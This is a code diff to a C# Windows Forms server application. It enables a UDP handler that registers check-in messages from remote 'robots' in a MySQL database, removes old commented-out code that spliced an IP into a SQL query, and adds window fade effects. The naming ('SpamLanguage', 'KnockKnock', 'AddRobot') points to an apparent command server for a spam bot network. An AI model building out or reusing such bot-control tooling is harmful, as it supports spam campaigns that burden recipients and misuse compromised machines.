@@ -12,6 +12,7 @@ using MySql.Data.MySqlClient;
 using ServerApp.Properties;
 using CommonTypes;
 using System.IO;
+using System.Threading;
 
 namespace ServerApp
 {
@@ -78,6 +79,8 @@ WHERE
 
 		#region UDP Interface
 
+		private delegate void VoidDelegate();
+
 		void Priem(IAsyncResult iar)
 		{
 			IPEndPoint remoteIPEndPoint = null;
@@ -86,31 +89,27 @@ WHERE
 
 			SpamLanguage verb = (SpamLanguage)bytes[0];
 
-			//switch ( verb )
-			//{
-			//case SpamLanguage.KnockKnock:
-			//    AddRobot(remoteIPEndPoint.Address.ToString());
-			//    break;
-			//default:
-			//    MessageBox.Show("Incorrect command received");
-			//    break;
-			//}
+			switch ( verb )
+			{
+			case SpamLanguage.KnockKnock:
+				dbClient.AddRobot(remoteIPEndPoint.Address.ToString());
+				break;
+			default:
+				Thread messageThread = new Thread(new ThreadStart(delegate()
+				{
+					MessageBox.Show("Incorrect command received");
+				}));
+				messageThread.Start();
+				break;
+			}
 
 			udpClient.BeginReceive(Priem, iar);
 		}
-
-		//        private void AddRobot(string Ip)
-		//        {
-		//            dbClient.SendQuery(
-		//@"INSERT robots
-		//SET IP='"+Ip+@"',Email='"+sets.DefaultEmail+"'");
-		//        }
 
 		private void Say(string Host, int Port, SpamLanguage cmd)
 		{
 			Say(Host, Port, cmd, new byte[0]);
 		}
-
 		private void Say(string Host, int Port,
 			SpamLanguage cmd, byte[] attachment)
 		{
@@ -183,6 +182,28 @@ WHERE
 			if ( DbAvailable )
 				tabControl1_SelectedIndexChanged(sender, e);
 			listMessages.ValueMember = "Id";
+		}
+		private void FormServer_Shown(object sender, EventArgs e)
+		{
+			double msec = 1000;
+			double steps = 100;
+			for ( double i = this.Opacity; i <= 1.0; i += 1.0 / steps )
+			{
+				this.Opacity = i;
+				Application.DoEvents();
+				Thread.Sleep((int)( Math.Ceiling(msec / steps) ));
+			}
+		}
+		private void FormServer_FormClosing(object sender, FormClosingEventArgs e)
+		{
+			double msec = 600;
+			double steps = 80;
+			for ( double i = this.Opacity; i >= 0; i -= 1.0 / steps )
+			{
+				this.Opacity = i;
+				Application.DoEvents();
+				Thread.Sleep((int)( Math.Ceiling(msec / steps) ));
+			}
 		}
 
 		private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -390,5 +411,7 @@ SET State=NULL");
 		}
 
 		#endregion
+
+
 	}
 }
